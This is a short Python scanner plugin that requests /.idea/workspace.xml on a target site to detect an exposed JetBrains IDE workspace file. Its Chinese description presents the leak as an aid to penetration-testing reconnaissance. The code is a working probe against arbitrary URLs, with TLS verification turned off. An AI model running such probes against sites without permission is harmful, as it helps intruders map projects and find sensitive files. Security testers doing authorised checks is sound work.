#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: JetBrains IDE workspace.xml文件泄露
referer: http://www.ab156.com/vul/view/vulid/3631.html
author: Lucifer
description: 网站存在JetBrains系列IDE的工作区文件，可以泄露整个工程的目录结构信息。通过下载workspace.xml，可直接获取整个工程的目录结构，发现敏感文件，为渗透中收集信息、发现漏洞提供了极大的便利。
'''
import sys
import requests


class jetbrains_ide_workspace_disclosure_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/.idea/workspace.xml"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"<?xml version=" in req.text and r"project version" in req.text and req.status_code==200:
                return "[+]存在JetBrains IDE workspace.xml文件泄露漏洞...(中危)\tpayload: "+vulnurl
            else:
                return "[-]NO vuln!"
        except:
            return "[-] ======>连接超时"

if __name__ == "__main__":
    testVuln = jetbrains_ide_workspace_disclosure_BaseVerify(sys.argv[1])
    testVuln.run()